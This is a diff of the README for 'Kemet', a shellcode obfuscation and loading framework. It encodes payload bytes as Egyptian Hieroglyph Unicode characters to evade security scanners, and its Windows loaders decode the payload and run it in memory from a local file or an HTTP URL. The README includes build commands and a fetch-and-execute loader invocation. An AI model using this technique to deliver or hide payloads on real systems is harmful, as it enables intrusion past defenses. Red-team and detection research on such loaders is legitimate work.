@@ -1,145 +1,77 @@
-🛡️ Kemet Shellcode Obfuscation & Loading Framework
-<p align="center">
-<img src="https://i.imgur.com/6s1Y3pJ.png" alt="Kemet Logo" width="600">
-</p>
+# 🛡️ Kemet Shellcode Loader
 
-<p align="center">
-<a href="https://github.com/yourusername/kemet/releases">
-<img src="https://img.shields.io/github/release/yourusername/kemet.svg" alt="Latest Release">
-</a>
-<a href="https://github.com/yourusername/kemet/blob/master/LICENSE">
-<img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License">
-</a>
-<a href="https://github.com/yourusername/kemet/actions">
-<img src="https://img.shields.io/github/workflow/status/yourusername/kemet/CI" alt="Build Status">
-</a>
-</p>
+![Kemet Loader Banner](https://your-cool-image-url-here.com/banner.png)
 
-Kemet is an advanced shellcode obfuscation and loading framework that uses Unicode characters to hide malicious payloads. It consists of a Python obfuscator and multiple C loaders for different deployment scenarios.
+Kemet Loader is a Unicode‑based shellcode obfuscation and loading framework.  
+It includes both a **Python obfuscator** and **Windows-native loaders** capable of decoding and executing Unicode‑encoded payloads from local files or HTTP sources.
 
-🚀 Features
-Unicode-based Obfuscation: Transforms shellcode into Unicode text that bypasses many security solutions
-Multiple Loading Methods: Local file loader and HTTP-based remote loader
-Cross-platform Compatibility: Works on Windows systems with proper compiler
-Memory-safe Operations: Proper allocation and protection of executable memory
-Minimal Footprint: Lightweight implementation with no unnecessary dependencies
-📦 Installation
-Prerequisites
-Python 3.x
-C compiler (GCC/Clang on Linux, MSVC on Windows)
-Windows SDK (for Windows-specific APIs)
-Build Instructions
-Clone the repository:
-bash
+---
 
-Line Wrapping
+## 🚀 Features
 
-Collapse
-Copy
-1
-2
-git clone https://github.com/yourusername/kemet.git
-cd kemet
-Build the C loaders:
-bash
+- **Unicode Shellcode Obfuscation**  
+  Encodes raw shellcode bytes into high‑range Unicode characters for stealthy transport.
 
-Line Wrapping
+- **Local & Remote Loading**  
+  Supports execution from local UTF‑8 encoded files or direct HTTP download.
 
-Collapse
-Copy
-1
-2
-3
-4
-5
-6
-7
-# On Linux with MinGW
-x86_64-w64-mingw32-gcc -o kemet_loader.exe kemet_loader.c -lwininet
-x86_64-w64-mingw32-gcc -o kemet_http_loader.exe kemet_http_loader.c -lwininet
+- **In‑Memory Execution**  
+  Allocates RWX memory, decodes bytes, and executes the payload without touching disk.
 
-# On Windows with MSVC
-cl kemet_loader.c wininet.lib
-cl kemet_http_loader.c wininet.lib
-🔧 Usage
-Step 1: Obfuscate Your Shellcode
-bash
+- **Surrogate-Pair Handling**  
+  Proper decoding of multi‑byte UTF‑8 sequences and Unicode surrogate pairs.
 
-Line Wrapping
+---
 
-Collapse
-Copy
-1
-python obfuscate.py shellcode.bin -o obfuscated.txt
-Step 2: Load and Execute
-Local File Loader
-bash
+## 📦 Components
 
-Line Wrapping
+### 🔹 Python Obfuscator  
+`obfuscate.py` converts binary shellcode into a sequence of characters starting at Unicode base `0x13000`.
 
-Collapse
-Copy
-1
-kemet_loader.exe obfuscated.txt
-HTTP Remote Loader
-bash
+### 🔹 Local Loader  
+Reads a UTF‑8 file, decodes the Unicode sequence, converts it back to bytes, and executes it from memory.
 
-Line Wrapping
+### 🔹 HTTP Loader  
+Uses WinINet to fetch obfuscated Unicode data from a remote server, decode it, and execute in memory.
 
-Collapse
-Copy
-1
-kemet_http_loader.exe http://example.com/obfuscated.txt
-🛠️ How It Works
-Obfuscation Process:
-The Python script reads binary shellcode
-Each byte is converted to a Unicode character using a base offset (0x13000)
-The resulting Unicode text is saved to a file
-Loading Process:
-The C loader reads the Unicode text
-It decodes each character back to its original byte value
-The shellcode is allocated in executable memory
-Memory protections are adjusted for execution
-The shellcode is executed as a function
-HTTP Loading:
-Downloads the obfuscated Unicode text from a remote URL
-Follows the same decoding and execution process as the local loader
-🧪 Technical Details
-Unicode Obfuscation Technique
-The framework uses a simple but effective technique:
+---
 
-Each shellcode byte (0-255) is mapped to a Unicode character in the range 0x13000-0x130FF
-This range is part of the Egyptian Hieroglyphs block, making the obfuscated text appear as hieroglyphs
-Security solutions often don't scan for executable content in this Unicode range
-Memory Protection
-The loaders implement proper memory protection:
+## 🛠️ Build Instructions
 
-Allocate memory with PAGE_EXECUTE_READWRITE
-Copy shellcode to the allocated memory
-Change protection to PAGE_EXECUTE_READ
-Execute the shellcode as a function
-⚠️ Security Considerations
-This tool is designed for educational and authorized security testing purposes only
-Always ensure you have proper authorization before using these tools
-The obfuscation technique may not bypass all security solutions
-Use responsibly and in accordance with applicable laws and regulations
-🤝 Contributing
-Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.
+### Compile the Windows loader  
+```bash
+cl kemet_loader.c /link wininet.lib
+```
+### Obfuscate shellcode
+```bash
+python obfuscate.py input.bin -o output.txt
+```
 
-Development Guidelines
-Follow the existing code style
-Add comments to explain complex parts of the code
-Test your changes thoroughly
-Update documentation as needed
-📄 License
-This project is licensed under the MIT License - see the LICENSE file for details.
+### Run local loader
+```bash
+kemet_loader.exe output.txt
 
-🙏 Acknowledgments
-Inspired by various shellcode loading techniques
-Thanks to the security research community for their valuable insights
-📞 Contact
-If you have any questions or suggestions, feel free to open an issue or contact us at [your-email@example.com].
+```
+### Run HTTP loader
+```bash
+kemet_http_loader.exe https://example.com/payload.txt
+```
+##📘 How It Works
+Encoding
+Each shellcode byte is transformed into a Unicode code point:
 
-<p align="center">
-<i>"In the world of cybersecurity, knowledge is both the shield and the sword."</i>
-</p>
+```ini
+encoded = 0x13000 + byte_value
+```
+Transport
+Encoded content is distributed as UTF‑8 text.
+
+Decoding
+The loader reads each Unicode code point and subtracts the base offset to recover the original byte.
+
+Execution
+Memory is allocated via VirtualAlloc, permissions updated via VirtualProtect, then executed.
+
+⚠️ Disclaimer
+This project is for defensive research, education, and authorized security testing only.
+Execution of arbitrary shellcode can be harmful if misused.
